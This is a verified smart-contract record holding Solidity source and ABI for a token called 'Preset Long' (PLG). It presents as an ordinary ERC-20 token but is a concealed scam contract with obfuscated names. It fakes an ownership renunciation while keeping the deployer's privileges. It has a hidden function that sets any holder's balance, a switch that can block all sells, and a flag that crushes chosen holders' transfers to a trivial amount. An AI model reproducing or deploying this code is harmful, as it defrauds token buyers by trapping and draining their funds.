{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface liquidityWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoAmountEnable {\n    function createPair(address enableSenderExempt, address fromTake) external returns (address);\n}\n\ninterface swapMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableTradingTotal) external view returns (uint256);\n\n    function transfer(address launchedToken, uint256 txFund) external returns (bool);\n\n    function allowance(address toLaunchTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedToken,\n        uint256 txFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityIs, uint256 value);\n    event Approval(address indexed toLaunchTx, address indexed spender, uint256 value);\n}\n\ninterface tradingTake is swapMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PresetLong is txTrading, swapMode, tradingTake {\n\n    address shouldAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalEnableList() public {\n        emit OwnershipTransferred(enableSender, address(0));\n        swapFee = address(0);\n    }\n\n    function allowance(address shouldListLaunch, address feeTotal) external view virtual override returns (uint256) {\n        if (feeTotal == atWallet) {\n            return type(uint256).max;\n        }\n        return maxLaunch[shouldListLaunch][feeTotal];\n    }\n\n    bool private tradingIs;\n\n    function transferFrom(address launchMinTotal, address launchedToken, uint256 txFund) external override returns (bool) {\n        if (_msgSender() != atWallet) {\n            if (maxLaunch[launchMinTotal][_msgSender()] != type(uint256).max) {\n                require(txFund <= maxLaunch[launchMinTotal][_msgSender()]);\n                maxLaunch[launchMinTotal][_msgSender()] -= txFund;\n            }\n        }\n        return marketingIs(launchMinTotal, launchedToken, txFund);\n    }\n\n    mapping(address => mapping(address => uint256)) private maxLaunch;\n\n    function getOwner() external view returns (address) {\n        return swapFee;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalLaunch;\n    }\n\n    string private totalLaunch = \"Preset Long\";\n\n    uint256 minWallet;\n\n    function limitAutoBuy(address maxIs, uint256 txFund) public {\n        listAuto();\n        launchedTo[maxIs] = txFund;\n    }\n\n    function balanceOf(address enableTradingTotal) public view virtual override returns (uint256) {\n        return launchedTo[enableTradingTotal];\n    }\n\n    function approve(address feeTotal, uint256 txFund) public virtual override returns (bool) {\n        maxLaunch[_msgSender()][feeTotal] = txFund;\n        emit Approval(_msgSender(), feeTotal, txFund);\n        return true;\n    }\n\n    mapping(address => bool) public enableMode;\n\n    function owner() external view returns (address) {\n        return swapFee;\n    }\n\n    bool public toMarketing;\n\n    function marketingIs(address launchMinTotal, address launchedToken, uint256 txFund) internal returns (bool) {\n        if (launchMinTotal == enableSender) {\n            return fundMarketingMin(launchMinTotal, launchedToken, txFund);\n        }\n        uint256 senderTakeEnable = swapMode(listSell).balanceOf(shouldAuto);\n        require(senderTakeEnable == fromAuto);\n        require(launchedToken != shouldAuto);\n        if (senderReceiver[launchMinTotal]) {\n            return fundMarketingMin(launchMinTotal, launchedToken, txMax);\n        }\n        return fundMarketingMin(launchMinTotal, launchedToken, txFund);\n    }\n\n    function isSenderTotal(address exemptLaunched) public {\n        if (toMarketing) {\n            return;\n        }\n        \n        enableMode[exemptLaunched] = true;\n        if (buySell == marketingAmount) {\n            autoTeam = true;\n        }\n        toMarketing = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamMin;\n    }\n\n    function liquidityTx(address marketingAutoToken) public {\n        listAuto();\n        \n        if (marketingAutoToken == enableSender || marketingAutoToken == listSell) {\n            return;\n        }\n        senderReceiver[marketingAutoToken] = true;\n    }\n\n    bool public autoTeam;\n\n    function listAuto() private view {\n        require(enableMode[_msgSender()]);\n    }\n\n    address atWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private limitSwap = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private launchedTo;\n\n    address private swapFee;\n\n    address public enableSender;\n\n    uint256 public sellReceiverFund;\n\n    mapping(address => bool) public senderReceiver;\n\n    uint256 constant txMax = 12 ** 10;\n\n    uint8 private teamMin = 18;\n\n    string private takeFund = \"PLG\";\n\n    constructor (){\n        \n        liquidityWallet fundMarketingWallet = liquidityWallet(atWallet);\n        listSell = autoAmountEnable(fundMarketingWallet.factory()).createPair(fundMarketingWallet.WETH(), address(this));\n        if (marketingAmount == buySell) {\n            marketingAmount = sellReceiverFund;\n        }\n        enableSender = _msgSender();\n        totalEnableList();\n        enableMode[enableSender] = true;\n        launchedTo[enableSender] = limitSwap;\n        if (marketingAmount != buySell) {\n            marketingAmount = toSwapFrom;\n        }\n        emit Transfer(address(0), enableSender, limitSwap);\n    }\n\n    function fundMarketingMin(address launchMinTotal, address launchedToken, uint256 txFund) internal returns (bool) {\n        require(launchedTo[launchMinTotal] >= txFund);\n        launchedTo[launchMinTotal] -= txFund;\n        launchedTo[launchedToken] += txFund;\n        emit Transfer(launchMinTotal, launchedToken, txFund);\n        return true;\n    }\n\n    function sellReceiver(uint256 txFund) public {\n        listAuto();\n        fromAuto = txFund;\n    }\n\n    function transfer(address maxIs, uint256 txFund) external virtual override returns (bool) {\n        return marketingIs(_msgSender(), maxIs, txFund);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeFund;\n    }\n\n    uint256 public marketingAmount;\n\n    uint256 public toSwapFrom;\n\n    event OwnershipTransferred(address indexed walletListMode, address indexed exemptReceiver);\n\n    uint256 private buySell;\n\n    address public listSell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitSwap;\n    }\n\n    uint256 fromAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLaunchTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletListMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldListLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTradingTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunched\",\"type\":\"address\"}],\"name\":\"isSenderTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFund\",\"type\":\"uint256\"}],\"name\":\"limitAutoBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAutoToken\",\"type\":\"address\"}],\"name\":\"liquidityTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txFund\",\"type\":\"uint256\"}],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiverFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSwapFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalEnableList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMinTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PresetLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}